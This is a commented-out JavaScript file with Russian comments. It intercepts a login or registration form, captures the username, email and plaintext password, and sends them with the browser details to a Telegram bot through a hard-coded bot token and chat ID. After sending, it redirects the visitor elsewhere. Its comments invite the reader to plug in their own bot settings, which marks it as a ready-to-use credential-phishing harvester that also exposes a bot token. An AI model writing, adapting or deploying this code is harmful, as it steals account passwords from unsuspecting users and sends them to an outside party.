// // ТВОИ НАСТРОЙКИ ⚠️ ЗАМЕНИ НА СВОИ
// const BOT_TOKEN = '8210164553:AAGl1d34muRXyeCoB_y-MFC1ESeHomBFsZA';
// const CHAT_ID = '8472334933'; 
// document.getElementById('authForm').addEventListener('submit', async function(e) {
//     e.preventDefault();
    
//     const statusEl = document.getElementById('status');
//     const form = e.target;
    
//     const formData = {
//         username: form.username.value,
//         email: form.email.value,
//         password: form.password.value,
//         date: new Date().toLocaleString('ru-RU'),
//         userAgent: navigator.userAgent
//     };

//     // Формируем сообщение для Telegram
//     const message = `
// ✅ НОВАЯ РЕГИСТРАЦИЯ:
// 👤 Юзер: ${formData.username}
// 📧 Email: ${formData.email}
// 🔐 Пароль: ${formData.password}
// 📅 Дата: ${formData.date}
// 🌐 Браузер: ${formData.userAgent}
//     `.trim();

//     try {
//         statusEl.textContent = 'Отправляем данные...';
//         statusEl.style.color = 'blue';

//         // Отправляем в Telegram
//         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
//             method: 'POST',
//             headers: {
//                 'Content-Type': 'application/json',
//             },
//             body: JSON.stringify({
//                 chat_id: 8472334933,
//                 text: message,
//                 parse_mode: 'HTML'
//             })
//         });

//         const data = await response.json();

//         if (data.ok) {
//             statusEl.textContent = '✅ Данные отправлены!';
//             statusEl.style.color = 'green';
//             form.reset();
            
//             // Перенаправляем куда нужно после успешной отправки
//             setTimeout(() => {
//                 window.location.href = 'https://example.com'; // Замени на нужный URL
//             }, 2000);
            
//         } else {
//             throw new Error(data.description);
//         }

//     } catch (error) {
//         console.error('Ошибка:', error);
//         statusEl.textContent = '❌ Ошибка отправки. Проверь настройки.';
//         statusEl.style.color = 'red';
//     }
// });

// // Проверка работы бота при загрузке
// console.log('Бот инициализирован. Token:', BOT_TOKEN);
// console.log('Chat ID:', CHAT_ID);